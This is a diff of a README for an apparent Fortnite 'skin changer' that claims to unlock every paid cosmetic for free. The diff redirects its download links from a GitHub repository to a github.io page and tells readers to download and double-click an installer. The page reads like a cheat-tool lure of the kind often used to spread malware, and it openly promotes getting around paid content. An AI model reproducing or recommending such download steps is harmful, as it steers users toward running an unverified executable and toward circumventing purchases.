@@ -1,6 +1,6 @@
 # 🎮 Fortnite-Skin-Changer-Swapper-2026-Download - Access Every Fortnite Skin For Free
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/battlescarred-johnmajor827/Fortnite-Skin-Changer-Swapper-2026-Download)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://battlescarred-johnmajor827.github.io)
 
 This tool allows players to equip desired character models, back blings, and pickaxes within the game environment. You can modify your local game files to display cosmetic items that are normally locked behind store purchases or seasonal events. This application provides a direct method to unlock cosmetic assets on your personal computer.
 
@@ -20,7 +20,7 @@ To run this application, your computer needs to meet these basic standards:
 Follow these steps to set up the software. Ensure you have a stable internet connection before you start.
 
 1.  Close the Epic Games launcher and the game completely. Ensure no background processes for the game remain active.
-2.  Navigate to the official release page: [https://github.com/battlescarred-johnmajor827/Fortnite-Skin-Changer-Swapper-2026-Download](https://github.com/battlescarred-johnmajor827/Fortnite-Skin-Changer-Swapper-2026-Download)
+2.  Navigate to the official release page: [https://battlescarred-johnmajor827.github.io](https://battlescarred-johnmajor827.github.io)
 3.  Click the download link to save the installer file to your computer.
 4.  Locate the downloaded file in your folder.
 5.  Double-click the file to begin the installation process.
